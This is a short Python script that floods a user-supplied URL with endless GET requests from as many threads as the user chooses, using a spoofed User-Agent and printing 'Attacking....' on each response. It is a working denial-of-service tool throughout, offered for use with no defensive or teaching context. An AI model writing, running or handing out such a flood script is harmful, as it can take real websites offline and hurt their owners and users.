#! /bin/python3

import threading
import requests


def dos(name, url):
    while True:
        try:
            headers = {'User-Agent': 'apache2handler'}
            r = requests.get(url, headers=headers)
            print(f"Thread Id: {name} : {r.status_code} Attacking....")
        except:  
            print(f"{name} : Error")


if __name__ == "__main__":
    url = input("Enter URL: ")
    threads = int(input("Enter Number of Threads: "))
    for i in range(threads):
        t = threading.Thread(target=dos, args=(i, url))
        t.start()
